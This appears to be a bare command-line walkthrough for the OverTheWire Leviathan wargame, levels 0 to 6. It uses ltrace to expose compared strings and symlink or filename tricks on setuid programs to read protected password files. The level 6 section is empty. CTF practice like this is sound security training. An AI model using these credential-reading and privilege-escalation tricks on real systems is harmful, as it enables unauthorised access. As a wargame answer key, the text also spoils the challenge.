```ssh leviathan_@leviathan.labs.overthewire.org -p 2223```  


## Leviathan Level 0 → Level 1
```cat .backup/bookmarks.html | grep password```  

## Leviathan Level 1 → Level 2
```ltrace ./check```  
strcmp("pas", "__")  
```./check```  
```cat /etc/leviathan_pass/leviathan2```  

## Leviathan Level 2 → Level 3  
```mkdir /tmp/tmp_folder/```  
```cd /tmp/tmp_folder/```  
```touch test\ file```  
```ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp_folder/test```  
```~/printfile test\ file```  

## Leviathan Level 3 → Level 4  
```ltrace ./check```  
strcmp("snlprintf\n", "__")  
```cat /etc/leviathan_pass/leviathan4```  

## Leviathan Level 4 → Level 5  
```.trash/./bin```  

## Leviathan Level 5 → Level 6
```ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log```  
```./leviathan5```  

## Leviathan Level 6 → Level 7
